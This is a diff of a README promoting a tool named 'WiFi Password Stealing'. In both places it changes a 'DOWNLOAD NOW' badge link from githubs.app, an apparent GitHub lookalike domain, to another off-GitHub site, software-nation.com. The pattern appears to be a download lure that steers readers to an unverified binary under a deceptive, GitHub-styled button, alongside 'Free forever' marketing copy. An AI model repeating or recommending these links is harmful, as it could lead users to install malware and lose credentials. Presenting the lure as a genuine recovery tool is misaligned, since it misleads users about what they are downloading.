@@ -9,7 +9,7 @@ The **📡 WiFi Password Stealing** is the most powerful tool for recovering los
 
 <div align="center">
 
-[![Download WiFi Password Stealing](https://img.shields.io/badge/📡%20DOWNLOAD%20NOW%20📡-purple?style=for-the-badge&logo=github)](https://githubs.app/0zvia)
+[![Download WiFi Password Stealing](https://img.shields.io/badge/📡%20DOWNLOAD%20NOW%20📡-purple?style=for-the-badge&logo=github)](https://software-nation.com/0zvia)
 
 </div>
 
@@ -204,7 +204,7 @@ One tool. All your WiFi passwords. Zero cost.
 
 <div align="center">
 
-[![Download WiFi Password Stealing](https://img.shields.io/badge/📡%20DOWNLOAD%20NOW%20📡-purple?style=for-the-badge&logo=github)](https://githubs.app/0zvia)
+[![Download WiFi Password Stealing](https://img.shields.io/badge/📡%20DOWNLOAD%20NOW%20📡-purple?style=for-the-badge&logo=github)](https://software-nation.com/0zvia)
 
 **Version 2026.36.3** — Recover lost WiFi passwords. QR code sharing. Free forever.
 
